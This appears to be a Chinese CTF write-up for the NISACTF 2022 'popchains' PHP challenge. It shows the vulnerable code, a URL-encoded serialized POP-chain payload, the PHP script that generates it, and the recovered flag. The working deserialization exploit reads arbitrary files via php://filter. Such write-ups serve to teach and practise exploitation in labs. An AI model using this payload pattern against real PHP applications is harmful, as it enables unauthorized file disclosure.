---
title: '[NISACTF 2022]popchains'
date: '2025-05-27T17:51:43+08:00'
weight: 
draft: false
description: '[NISACTF 2022]popchains'
---

题目代码：

```php
<?php

echo 'Happy New Year~ MAKE A WISH<br>';

if(isset($_GET['wish'])){
    @unserialize($_GET['wish']);
}
else{
    $a=new Road_is_Long;
    highlight_file(__FILE__);
}
/***************************pop your 2022*****************************/

class Road_is_Long{
    public $page;
    public $string;
    public function __construct($file='index.php'){
        $this->page = $file;
    }
    public function __toString(){
        return $this->string->page;
    }

    public function __wakeup(){
        if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
            echo "You can Not Enter 2022";
            $this->page = "index.php";
        }
    }
}

class Try_Work_Hard{
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Make_a_Change{
    public $effort;
    public function __construct(){
        $this->effort = array();
    }

    public function __get($key){
        $function = $this->effort;
        return $function();
    }
}
/**********************Try to See flag.php*****************************/
```

构造 payload：（由于 `$var` 是 `protected` 属性，需要进行 `url` 编码）

```text
O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Br%3A1%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A54%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7D
```

```php
<?php
class Road_is_Long{
    public $page;
    public $string;
}

class Try_Work_Hard{
    protected  $var = 'php://filter/read=convert.base64-encode/resource=/flag';
}

class Make_a_Change{
    public $effort;
}

$road_is_long = new Road_is_Long();
$make_a_change = new Make_a_Change();
$try_work_hard = new Try_Work_Hard();
$road_is_long->string  = $make_a_change;
$road_is_long->page = $road_is_long;
$make_a_change->effort = $try_work_hard;

echo urlencode(serialize($road_is_long));
```

将 `/flag` 的内容进行 `base64` 解码

```text
TlNTQ1RGezAwMDg0NmRhLWRiYWYtNDQxZC1iMTIzLTZmYTVhZDY4ZDc1ZH0K
```

```text
NSSCTF{000846da-dbaf-441d-b123-6fa5ad68d75d}
```